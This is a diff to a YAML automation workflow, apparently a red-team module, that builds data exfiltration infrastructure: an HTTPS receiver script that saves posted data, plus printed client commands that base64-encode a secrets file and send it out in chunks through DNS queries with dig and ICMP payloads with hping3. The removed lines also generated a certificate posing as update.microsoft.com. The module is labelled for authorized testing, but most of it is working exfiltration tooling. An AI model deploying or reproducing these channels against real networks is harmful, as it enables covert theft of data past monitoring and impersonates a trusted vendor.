@@ -1,10 +1,13 @@
 name: exfil-channels
 description: |
-  Set up multiple data exfiltration channels — configures DNS, HTTP,
-  and ICMP exfil servers for testing data exfiltration paths during
-  red team engagements.
-tags: [setup, exfil, opsec, c2]
-
+  Set up multiple data exfiltration channels for authorized red team
+  operations — configures HTTPS receiver server with self-signed cert,
+  DNS tunneling notes, and ICMP exfil guidance for controlled tests.
+tags:
+  - setup
+  - exfil
+  - c2
+  - data-transfer
 dispatch:
   inputs:
     log_command:
@@ -15,109 +18,259 @@ dispatch:
       type: string
       default: "true"
       description: Enable stdout output log files for steps when set to true/false.
+    target:
+      type: string
+      default: "0.0.0.0"
+      description: IP address to bind listeners on
+      alias: t
     listen_ip:
       type: string
       default: "0.0.0.0"
-      description: IP to bind exfil listeners on
-    dns_domain:
-      type: string
-      default: ""
-      description: Domain for DNS exfil (empty to skip DNS channel)
+      description: IP address to bind listeners on
     http_port:
       type: number
       default: 8443
       description: Port for HTTPS exfil receiver
+    use_letsencrypt:
+      type: boolean
+      default: false
+      description: Obtain Let's Encrypt cert for HTTPS exfil (requires valid DNS)
+    domain:
+      type: string
+      default: ""
+      description: Domain name for Let's Encrypt certificate
+    dns_domain:
+      type: string
+      default: ""
+      description: Domain for DNS exfil channel (empty to skip)
+    icmp_enabled:
+      type: boolean
+      default: true
+      description: Include ICMP exfil notes/instructions
     output_dir:
       type: string
-      default: "/tmp/exfil-data"
-      description: Directory to store received exfil data
+      default: "/tmp/ofx-exfil"
+      description: Directory to store captured exfil data
+defaults:
+    store-creds: true
 
 jobs:
   prepare:
-    name: Prepare Directories
+    name: Prepare Exfil Infrastructure
     outputs:
       output_dir: "{{ inputs.output_dir }}"
+      http_port: "{{ inputs.http_port }}"
     steps:
-      - name: Create output dirs
+      - name: create output directories
         run: |
-          mkdir -p {{ inputs.output_dir }}/{dns,http,icmp}
-          echo "Exfil output: {{ inputs.output_dir }}"
+          set -euo pipefail
+          OUTDIR="{{ inputs.output_dir }}"
+          mkdir -p "$OUTDIR/http" "$OUTDIR/dns" "$OUTDIR/icmp"
+          echo "Exfil output directory: $OUTDIR"
+        log-stdout: "{{ inputs.log_output | default(true) }}"
+        retry: 1
+        retry-delay: 5
+        continue-on-error: true
 
-  http-channel:
-    name: HTTP Exfil Server
+      - name: install dependencies
+        log-command: "{{ inputs.log_command | default(true) }}"
+        run: |
+          set -euo pipefail
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq python3 python3-pip socat tcpdump openssl certbot
+        retry: 2
+        retry-delay: 10
+        continue-on-error: true
+
+  http-exfil:
+    name: HTTPS Exfil Receiver
     needs: [prepare]
+    outputs:
+      http_receiver_script: "{{ steps.write-receiver.outputs.http_receiver_script | default('', true) }}"
+      http_cert: "{{ steps.generate-certificate.outputs.http_cert | default('', true) }}"
+      http_key: "{{ steps.generate-certificate.outputs.http_key | default('', true) }}"
     steps:
-      - name: Create HTTPS receiver
+      - name: generate-certificate
         log-command: "{{ inputs.log_command | default(true) }}"
         script: |
-          import ssl
-          import os
+          from pathlib import Path
+          import subprocess
+          import shutil
+
+          use_le = "{{ inputs.use_letsencrypt }}" == "true"
+          domain = "{{ inputs.domain }}"
+          cert_path = "/tmp/ofx-exfil-cert.pem"
+          key_path = "/tmp/ofx-exfil-key.pem"
+
+          if use_le and domain:
+              try:
+                  subprocess.run([
+                      "sudo", "certbot", "certonly", "--standalone",
+                      "-d", domain,
+                      "--non-interactive", "--agree-tos",
+                      "--register-unsafely-without-email"
+                  ], check=True)
+                  cert_src = f"/etc/letsencrypt/live/{domain}/fullchain.pem"
+                  key_src = f"/etc/letsencrypt/live/{domain}/privkey.pem"
+                  if Path(cert_src).exists() and Path(key_src).exists():
+                      shutil.copy2(cert_src, cert_path)
+                      shutil.copy2(key_src, key_path)
+                      print(f"Using Let's Encrypt cert for {domain}")
+                  else:
+                      use_le = False
+              except Exception as exc:
+                  print(f"Let's Encrypt failed: {exc}")
+                  use_le = False
+
+          if not use_le:
+              subprocess.run([
+                  "openssl", "req", "-x509", "-nodes", "-days", "365",
+                  "-newkey", "rsa:2048",
+                  "-keyout", key_path,
+                  "-out", cert_path,
+                  "-subj", f"/CN={domain or 'exfil.ofx.local'}"
+              ], check=True)
+              print(f"Generated self-signed cert: {cert_path}")
+
+          add_outputs(http_cert=cert_path, http_key=key_path)
+        retry: 1
+        retry-delay: 5
+        continue-on-error: true
+
+      - name: write-receiver
+        log-command: "{{ inputs.log_command | default(true) }}"
+        script: |
           from pathlib import Path
 
+          listen_ip = "{{ inputs.listen_ip }}" or "{{ inputs.target }}"
           port = {{ inputs.http_port }}
-          output_dir = "{{ inputs.output_dir }}/http"
+          outdir = "{{ inputs.output_dir }}/http"
 
-          # Generate self-signed cert
-          cert_path = "/tmp/exfil-cert.pem"
-          key_path = "/tmp/exfil-key.pem"
-          if not Path(cert_path).exists():
-              os.system(
-                  f"openssl req -x509 -nodes -days 30 -newkey rsa:2048 "
-                  f"-keyout {key_path} -out {cert_path} "
-                  f'-subj "/CN=update.microsoft.com"'
-              )
-
-          # Write receiver script
-          receiver = f'''#!/usr/bin/env python3
-          import http.server, ssl, os, base64, json
+          script_content = f'''#!/usr/bin/env python3
+          import http.server
+          import ssl
           from datetime import datetime
+          from pathlib import Path
+
+          OUTPUT_DIR = Path("{outdir}")
+          OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
 
           class ExfilHandler(http.server.BaseHTTPRequestHandler):
               def do_POST(self):
                   length = int(self.headers.get("Content-Length", 0))
-                  data = self.rfile.read(length)
-                  ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-                  outfile = f"{output_dir}/{{ts}}_exfil.bin"
-                  with open(outfile, "wb") as f:
-                      f.write(data)
+                  body = self.rfile.read(length)
+                  ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
+                  outfile = OUTPUT_DIR / f"{{ts}}_exfil.bin"
+                  outfile.write_bytes(body)
                   self.send_response(200)
                   self.end_headers()
                   self.wfile.write(b"OK")
                   self.log_message("Received %d bytes -> %s", length, outfile)
 
+              def do_PUT(self):
+                  self.do_POST()
+
               def log_message(self, fmt, *args):
                   print(f"[HTTP-EXFIL] {{fmt % args}}")
 
           ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-          ctx.load_cert_chain("{cert_path}", "{key_path}")
-          srv = http.server.HTTPServer(("{{ inputs.listen_ip }}", {port}), ExfilHandler)
+          ctx.load_cert_chain("/tmp/ofx-exfil-cert.pem", "/tmp/ofx-exfil-key.pem")
+          srv = http.server.HTTPServer(("{listen_ip}", {port}), ExfilHandler)
           srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
-          print(f"HTTPS exfil receiver on :{port}")
+          print(f"[+] HTTPS exfil receiver listening on {listen_ip}:{port}")
+          print(f"[+] Output directory: {outdir}")
           srv.serve_forever()
           '''
 
-          script_path = "/tmp/exfil_http_receiver.py"
-          with open(script_path, "w") as f:
-              f.write(receiver)
-          print(f"HTTP receiver script: {script_path}")
-          print(f"Start with: python3 {script_path}")
-          print(f"Send data:  curl -k -X POST https://HOST:{port}/ -d @file")
+          path = Path("/tmp/ofx_http_exfil_receiver.py")
+          path.write_text(script_content)
+          path.chmod(0o755)
 
-  dns-channel:
-    name: DNS Exfil Notes
+          add_outputs(http_receiver_script=str(path))
+          print(f"HTTP receiver script: {path}")
+          print(f"Start with: python3 {path}")
+        retry: 1
+        retry-delay: 5
+        continue-on-error: true
+
+  dns-exfil:
+    name: DNS Exfil Configuration
     needs: [prepare]
     run_if: "{{ inputs.dns_domain }}"
     steps:
-      - name: DNS exfil instructions
+      - name: dns channel notes
+        script: |
+          domain = "{{ inputs.dns_domain }}"
+          listen_ip = "{{ inputs.listen_ip }}" or "{{ inputs.target }}"
+          outdir = "{{ inputs.output_dir }}/dns"
+
+          print("=== DNS EXFIL CHANNEL ===")
+          print(f"Domain: {domain}")
+          print(f"Listener IP: {listen_ip}")
+          print(f"Output: {outdir}")
+          print("")
+          print("Client-side exfil (Bash):")
+          print(r"  data=$(cat secret.txt | base64 -w0 | sed 's/\+/-/g; s/\//_/g')")
+          print(r'  while [ -n "$data" ]; do')
+          print(r'    chunk="${data:0:60}"')
+          print(f'    dig "$chunk.{domain}" @{listen_ip}')
+          print(r'    data="${data:60}"')
+          print(r'  done')
+          print("")
+          print("Listener (on redirector):")
+          print(f"  sudo tcpdump -i any -n 'port 53' -l | grep {domain} | tee {outdir}/dns.log")
+          print("")
+          print("Note: DNS exfil is noisy; prefer HTTPS channel for production testing.")
+
+  icmp-exfil:
+    name: ICMP Exfil Notes
+    needs: [prepare]
+    run_if: "{{ inputs.icmp_enabled }}"
+    steps:
+      - name: icmp channel notes
+        script: |
+          listen_ip = "{{ inputs.listen_ip }}" or "{{ inputs.target }}"
+          outdir = "{{ inputs.output_dir }}/icmp"
+
+          print("=== ICMP EXFIL CHANNEL ===")
+          print(f"Listener IP: {listen_ip}")
+          print(f"Output: {outdir}")
+          print("")
+          print("Listener (requires root):")
+          print(f"  sudo tcpdump -i any -n icmp -l | tee {outdir}/icmp.log")
+          print("")
+          print("Client-side exfil (hping3 required):")
+          print("  # Split file into chunks, send as ICMP payloads")
+          print(r"  data=$(cat secret.txt | base64)")
+          print(r'  for chunk in $(echo "$data" | fold -w 48); do')
+          print(f"    sudo hping3 --icmp -d 56 -E <(echo -n \"$chunk\") -p 0 {listen_ip}")
+          print(r"  done")
+          print("")
+          print("Note: ICMP exfil is slow and easily detected; use only for controlled labs.")
+
+  summary:
+    name: Exfil Channels Summary
+    needs: [prepare, http-exfil, dns-exfil, icmp-exfil]
+    steps:
+      - name: report
         run: |
-          echo "=== DNS Exfiltration Channel ==="
-          echo "Domain: {{ inputs.dns_domain }}"
+          echo "=== EXFIL CHANNELS SETUP REPORT ==="
+          echo "Listen IP: {{ inputs.listen_ip }}"
+          echo "HTTP Port: {{ inputs.http_port }}"
+          echo "Output Directory: {{ inputs.output_dir }}"
           echo ""
-          echo "Encode and send data via DNS queries:"
-          echo "  data=\$(cat secret.txt | base64 | tr '+/' '-_' | fold -w 60)"
-          echo "  for chunk in \$data; do"
-          echo "    dig \$chunk.{{ inputs.dns_domain }} @{{ inputs.listen_ip }}"
-          echo "  done"
+          echo "[+] HTTPS Exfil Receiver:"
+          echo "    Script: {{ jobs['http-exfil'].outputs.http_receiver_script }}"
+          echo "    Start: python3 {{ jobs['http-exfil'].outputs.http_receiver_script }}"
           echo ""
-          echo "Receive with: sudo tcpdump -i any -n 'port 53' -l | grep {{ inputs.dns_domain }}"
+          echo "[+] DNS Exfil: {{ inputs.dns_domain | default('disabled', true) }}"
+          echo "[+] ICMP Exfil Notes: {{ inputs.icmp_enabled }}"
+          echo ""
+          echo "[!] Remember to open firewall ports (e.g., 8443/tcp) if needed"
         log-stdout: "{{ inputs.log_output | default(true) }}"
+
+outputs:
+  output_dir: "{{ jobs['prepare'].outputs.output_dir }}"
+  http_receiver_script: "{{ jobs['http-exfil'].outputs.http_receiver_script | default('', true) }}"
+  http_cert: "{{ jobs['http-exfil'].outputs.http_cert | default('', true) }}"
+  http_key: "{{ jobs['http-exfil'].outputs.http_key | default('', true) }}"
